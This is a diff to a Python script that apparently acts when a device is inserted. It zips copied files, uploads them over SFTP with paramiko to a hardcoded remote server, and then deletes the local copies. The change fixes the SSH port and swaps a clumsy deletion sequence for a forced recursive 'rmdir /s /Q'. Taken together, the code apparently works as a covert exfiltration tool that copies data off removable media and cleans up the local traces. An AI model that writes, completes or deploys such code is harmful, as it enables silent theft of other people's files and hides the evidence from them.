@@ -6,10 +6,8 @@ keydata = b""" """ #key
 key = paramiko.RSAKey(data=decodebytes(keydata))
 ssh = paramiko.SSHClient()
 ssh.get_host_keys().add('', 'ssh-rsa', key)
-ssh.connect('ip', username='', password='',port=)# sftp server information
+ssh.connect('ip', username='', password='',port=22)# sftp server information port=default ssh port
 a="\*"
-
-
 def device_inserted():
     pass
     try:
@@ -24,16 +22,10 @@ def device_inserted():
     remotefilepath = "C:/Users/Administrator/Desktop/remote_file.zip"#server side file name  
     sftp.put(localpath,remotefilepath)#moves the local file
     sftp.close
-    os.system("del /f /s /q copy_f 1>nul")#fails to remove multiple nested folders
-    os.system("rmdir copy_f")
-    try:
-        os.system("move copy_f C:\$Recycle")#can remove nested files it's possible to just use this to remove
-    except:
-        pass
+    os.system("rmdir /s /Q copy_f")
     os.system("del zip_copy.zip")
 def device_removed():
     pass
-
 def diff(list1, list2):
     list_difference = [item for item in list1 if item not in list2]
     return list_difference
